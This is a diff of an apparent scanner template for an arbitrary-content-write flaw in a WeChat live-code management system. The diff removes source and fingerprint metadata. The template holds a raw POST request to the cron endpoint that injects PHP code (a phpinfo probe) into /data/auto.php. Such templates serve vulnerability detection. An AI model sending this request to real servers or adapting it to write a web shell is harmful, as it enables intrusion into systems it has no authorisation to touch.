@@ -3,12 +3,8 @@ info:
   name: 微信活码系统index后台任意内容写入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yhqi8ogndo0hgxet'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yhqi8ogndo0hgxet
-    fofa: body=".qn-user-login"
 http:
 - raw:
   - 'POST /index.php?s=/manage/cron/index HTTP/1.1
@@ -40,9 +36,6 @@ http:
 
     QUEUE_SET=%3C%3Fphp+phpinfo()%3B%3F%3E
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600182145-ce914c5f-fdf7-47ec-b435-f82d5d06b2e8.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600182382-04654689-de0f-4aff-ab68-f3b2677888ce.png)
 
     文件地址：/data/auto.php'
   redirects: false
